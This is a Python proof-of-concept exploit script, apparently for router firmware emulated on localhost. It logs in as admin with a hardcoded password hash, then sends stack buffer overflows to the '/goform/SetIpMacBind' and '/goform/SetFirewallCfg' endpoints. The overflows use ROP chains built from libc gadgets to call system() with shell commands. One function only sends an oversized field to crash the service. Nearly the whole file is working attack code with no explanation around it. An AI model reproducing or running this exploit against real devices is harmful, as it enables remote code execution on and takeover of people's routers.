import requests
from urllib import parse
from pwn import *

main_url = "http://localhost:20080"

def login_success():
    global password
    url = main_url + "/login/Auth"
    headers = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
    # password: ringzer0 (md5)
    data = {"username": "admin", "password": "ce80adc6ed1ab2b7f2c85b5fdcd8babc"}
    data = parse.urlencode(data)
    response = requests.post(url=url, headers=headers, data=data, allow_redirects=False)
    password = response.cookies.get_dict().get("password")
    if password is None:
        login_success()
    else:
        print(password)

def poc():
    url = main_url + "/goform/SetIpMacBind"
    cmd = b'touch /tmp/lesgo'
    libc_base = 0x40202000
    system_offset = 0x0005a270
    system_addr = libc_base + system_offset
    gadget1 = libc_base + 0x00018298
    gadget2 = libc_base + 0x00040cb8
    data = b'bindnum=1&list=' + b'A' * (428) + p32(gadget1) + p32(system_addr) + p32(gadget2) + cmd
    data = data.decode('latin1')

    headers = {'Cookie': 'password=' + password}
    response = requests.post(url=url, headers=headers, data=data, allow_redirects=False)
    print(response)
  
def new_segfault():
    url = main_url + "/goform/SetFirewallCfg"
    payload = "A" * 500
    data = {"firewallEn": payload}
    headers = {'Cookie': 'password=' + password}
    response = requests.post(url, headers=headers, data=data, timeout=5)
    response = requests.post(url, headers=headers, data=data, timeout=5)
    print(response.text)
    
def new_fin():
    url = main_url + "/goform/SetFirewallCfg"
    headers = {"Cookie":"password=" + password}
    
    cmd = b"touch /tmp/llgsjsm"
    libc_base_addr = 0x40202000
    
    libc = ELF("libc.so.0")
    system_offset = libc.symbols["system"]
    system_addr = libc_base_addr + system_offset
    r3_pop = libc_base_addr + 0x00018298
    move_r0 = libc_base_addr + 0x00040cb8
    payload = cyclic(52) + p32(r3_pop) + p32(system_addr) + p32(move_r0) + cmd
    data = {"firewallEn": payload}
    response = requests.post(url, headers=headers, data=data)

    print(response.text)
   

if __name__ == "__main__":
    login_success()
    print("OK")
    new_fin()
